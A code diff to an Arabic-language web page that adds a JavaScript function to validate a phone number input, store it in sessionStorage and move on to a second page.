@@ -211,7 +211,7 @@ body {
 <div class="link">لم يعد بإمكاني الوصول إلى رقمي</div>
 
 </div>  <div class="bottom">
-    <button class="button" onclick="window.location.href='/page2'">
+    <button class="button" onclick="goNext()">
         تفعيل الاتصال
     </button>
 </div>  <script>
@@ -229,5 +229,23 @@ function goNext() {
     // الانتقال للصفحة الثانية
     window.location.href = "/page2";
 }
-</script>  </body>  
+</script>  
+  <script>
+function goNext() {
+
+    var phone = document.getElementById("phone").value;
+
+    if (phone == "") {
+        alert("أدخل رقم الهاتف");
+        return;
+    }
+
+    sessionStorage.setItem("phone", phone);
+
+    window.location.href = "/page2";
+
+}
+  </script>
+  
+</body>  
 </html>  
